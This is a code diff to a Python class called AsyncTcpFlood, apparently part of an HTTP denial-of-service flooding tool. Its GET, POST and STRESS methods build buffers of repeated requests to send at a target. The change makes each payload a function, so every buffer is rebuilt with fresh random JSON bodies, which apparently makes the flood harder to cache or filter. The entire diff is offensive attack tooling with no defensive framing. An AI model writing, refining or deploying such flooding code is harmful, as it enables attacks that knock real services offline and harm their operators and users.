@@ -316,7 +316,7 @@ class AsyncTcpFlood:
         return await self._exec_proto(conn, on_connect, on_close)
 
     async def GET(self, on_connect=None) -> bool:
-        payload: bytes = self.build_request() * self._settings.requests_per_buffer
+        payload = lambda: self.build_request() * self._settings.requests_per_buffer
         return await self._generic_flood_proto(
             FloodSpecType.BUFFER,
             (payload, self._settings.requests_per_buffer),
@@ -333,15 +333,16 @@ class AsyncTcpFlood:
     RHEAD = RGET
 
     async def POST(self, on_connect=None) -> bool:
-        payload: bytes = self.build_request(
-            headers=(
-                self.default_headers() +
-                "Content-Length: 44\r\n"
-                "X-Requested-With: XMLHttpRequest\r\n"
-                "Content-Type: application/json\r\n"
-            ),
-            body='{"data": "%s"}' % Tools.rand_str(32)
-        ) * self._settings.requests_per_buffer
+        def payload() -> bytes:
+            return self.build_request(
+                headers=(
+                    self.default_headers() +
+                    "Content-Length: 44\r\n"
+                    "X-Requested-With: XMLHttpRequest\r\n"
+                    "Content-Type: application/json\r\n"
+                ),
+                body='{"data": "%s"}' % Tools.rand_str(32)
+            ) * self._settings.requests_per_buffer
         return await self._generic_flood_proto(
             FloodSpecType.BUFFER,
             (payload, self._settings.requests_per_buffer),
@@ -349,15 +350,16 @@ class AsyncTcpFlood:
         )
 
     async def STRESS(self, on_connect=None) -> bool:
-        payload: bytes = self.build_request(
-            headers=(
-                self.default_headers() +
-                f"Content-Length: 524\r\n"
-                "X-Requested-With: XMLHttpRequest\r\n"
-                "Content-Type: application/json\r\n"
-            ),
-            body='{"data": "%s"}' % Tools.rand_str(512)
-        ) * self._settings.requests_per_buffer
+        def payload() -> bytes:
+            return self.build_request(
+                headers=(
+                    self.default_headers() +
+                    f"Content-Length: 524\r\n"
+                    "X-Requested-With: XMLHttpRequest\r\n"
+                    "Content-Type: application/json\r\n"
+                ),
+                body='{"data": "%s"}' % Tools.rand_str(512)
+            ) * self._settings.requests_per_buffer
         return await self._generic_flood_proto(
             FloodSpecType.BUFFER,
             (payload, self._settings.requests_per_buffer),
